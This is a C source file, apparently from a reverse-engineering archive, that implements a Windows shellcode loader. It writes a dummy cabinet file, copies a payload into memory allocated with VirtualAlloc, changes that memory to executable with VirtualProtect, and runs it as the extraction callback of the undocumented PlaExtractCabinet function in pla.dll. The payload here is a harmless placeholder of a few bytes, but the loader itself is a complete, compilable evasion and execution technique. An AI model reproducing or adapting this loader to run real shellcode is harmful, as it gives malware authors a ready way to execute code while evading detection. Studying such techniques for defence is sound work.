/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  PlaExtractCabinet

Note:
    This trick need to extract files from .cab (Cabinet) file.
    Shellcode will be executed for every file inside the .cab. 
*/

#include <windows.h>
#include <pla.h>
#include <stdint.h>

// I don't find the .lib for implementing this, so we use the one inside pla.dll
typedef HRESULT PlaExtractCabinet_t (PCWSTR,PCWSTR,PLA_CABEXTRACT_CALLBACK,PVOID);
typedef PlaExtractCabinet_t FAR * pPlaExtractCabinet;


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // dummy .cab file
    uint8_t     cabfile[]   = "\x4d\x53\x43\x46\x00\x00\x00\x00\x53\x00\x00\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x03\x01\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa1\x54\x28\x7e\x00\x00\x64\x75\x6d\x6d\x79\x2e\x74\x78\x74\x00\x18\x75\x68\x6d\x05\x00\x05\x00\x64\x75\x6d\x6d\x79";
    uint32_t    cabsize     = 83;

    HMODULE     pla;
    HANDLE      f;
    DWORD       nwritten;

    // function pointer to internal API
    pPlaExtractCabinet func;

    // resolve all functions
    pla = LoadLibrary("pla.dll");
    func = (pPlaExtractCabinet) GetProcAddress(pla, "PlaExtractCabinet");

    // extract cab file
    f = CreateFile ("dummy.cab", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile (f, cabfile, cabsize, &nwritten, NULL);
    CloseHandle (f);

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // trigger execution
        func (L"dummy.cab", L".", (PLA_CABEXTRACT_CALLBACK)runtime, NULL);
    }

    FreeLibrary(pla);

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}